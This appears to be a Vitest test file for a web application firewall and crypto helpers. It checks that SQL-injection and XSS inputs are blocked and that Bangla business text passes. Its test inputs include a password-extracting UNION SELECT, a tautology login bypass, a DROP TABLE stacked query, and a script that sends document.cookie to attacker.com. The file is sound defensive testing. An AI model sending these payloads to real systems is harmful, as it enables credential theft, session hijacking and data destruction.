import { describe, it, expect, beforeEach } from "vitest";
import {
  checkRateLimit,
  inspectPayloadSecurity,
  resetRateLimits,
  clearThreatLogs,
  getThreatLogs,
} from "../waf-shield";
import { hashPassword, verifyPassword, generateEphemeralToken, signHmacToken, verifyHmacToken } from "../crypto-auth";

describe("Enterprise WAF Shield & Rate Limiting", () => {
  beforeEach(() => {
    resetRateLimits();
    clearThreatLogs();
  });

  it("allows standard requests within bucket capacity", () => {
    const res = checkRateLimit("192.168.1.5", "general");
    expect(res.allowed).toBe(true);
    expect(res.remaining).toBeGreaterThan(0);
  });

  it("throttles requests when burst rate limit is exceeded", () => {
    const testIp = "10.0.0.99";
    // General bucket has 60 tokens
    for (let i = 0; i < 60; i++) {
      const ok = checkRateLimit(testIp, "general");
      expect(ok.allowed).toBe(true);
    }

    // 61st request should be throttled
    const blocked = checkRateLimit(testIp, "general");
    expect(blocked.allowed).toBe(false);
    expect(blocked.retryAfterSec).toBeGreaterThanOrEqual(1);

    const logs = getThreatLogs();
    expect(logs.length).toBeGreaterThan(0);
    expect(logs[0].threatType).toBe("ddos");
  });

  it("detects and blocks classic SQL Injection UNION SELECT payloads", () => {
    const payload = {
      username: "admin",
      query: "' UNION ALL SELECT 1, null, password, 4 FROM users--",
    };
    const res = inspectPayloadSecurity(payload, "/api/search", "1.2.3.4");
    expect(res.safe).toBe(false);
    expect(res.threatType).toBe("sqli");
  });

  it("detects and blocks boolean tautology SQLi (' OR '1'='1)", () => {
    const payload = "admin' OR '1'='1";
    const res = inspectPayloadSecurity(payload, "/api/workplace/auth");
    expect(res.safe).toBe(false);
    expect(res.threatType).toBe("sqli");
  });

  it("detects stacked query attacks (; DROP TABLE users)", () => {
    const payload = { search: "phones; DROP TABLE workspace_users; --" };
    const res = inspectPayloadSecurity(payload);
    expect(res.safe).toBe(false);
    expect(res.threatType).toBe("sqli");
  });

  it("detects stored and reflected XSS payloads", () => {
    const payload = {
      bio: "Hello <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
    };
    const res = inspectPayloadSecurity(payload);
    expect(res.safe).toBe(false);
    expect(res.threatType).toBe("xss");
  });

  it("detects inline JavaScript event handlers (onerror=alert(1))", () => {
    const payload = `<img src="invalid.jpg" onerror="alert('pwned')" />`;
    const res = inspectPayloadSecurity(payload);
    expect(res.safe).toBe(false);
    expect(res.threatType).toBe("xss");
  });

  it("allows legitimate Bangla and English business content without false positives", () => {
    const legitimate = {
      companyName: "গ্রামীণ ট্রেডার্স",
      description: "আমাদের দোকানে চাল, ডাল, তেল ও বিকাশ ক্যাশ-আউট সুবিধা পাওয়া যায়।",
      invoiceNumber: "INV-2026-0045",
      items: [
        { name: "মিনিকেট চাল ৫০ কেজি", qty: 2, price: 3400 },
        { name: "সয়াবিন তেল ৫ লিটার", qty: 4, price: 890 },
      ],
      notes: "Please deliver before 5:00 PM. Contact: 01711000000",
      mathFormula: "1450 * 1.15 - 120 + (2500 / 4)",
      currencySymbols: "মূল্য: ৳১২,৫০০ এবং ইনসেন্টিভ: $১,০০০ @ ২.৫% বোনাস",
      landRecord: "১০ শতক = ৬.০৬০ কাঠা (৪৩৫৬ বর্গফুট) - মৌজা: তেজগাঁও",
      bcsCandidate: "মো. সাব্বিরুল ইসলাম খান - ৩০০ x ৩০০ পিক্সেল ছবি এবং স্বাক্ষর",
    };
    const res = inspectPayloadSecurity(legitimate);
    expect(res.safe).toBe(true);
    expect(res.threats.length).toBe(0);
  });
});

describe("Cryptographic Helpers (crypto-auth.ts)", () => {
  it("hashes and verifies passwords deterministically", () => {
    const pass = "secret_pass_2026";
    const hash = hashPassword(pass);
    expect(verifyPassword(pass, hash)).toBe(true);
    expect(verifyPassword("wrong_pass", hash)).toBe(false);
  });

  it("generates 10-char unambiguous alphanumeric tokens", () => {
    const token = generateEphemeralToken(10);
    expect(token).toHaveLength(10);
    expect(/^[a-z0-9]+$/.test(token)).toBe(true);
  });

  it("signs and verifies HMAC tokens", () => {
    const payload = { user: "thesabbirbd", role: "superadmin" };
    const token = signHmacToken(payload);
    const decoded = verifyHmacToken<typeof payload>(token);
    expect(decoded).toEqual(payload);

    // Tampered token fails
    const tampered = token.slice(0, -3) + "xyz";
    expect(verifyHmacToken(tampered)).toBeNull();
  });
});
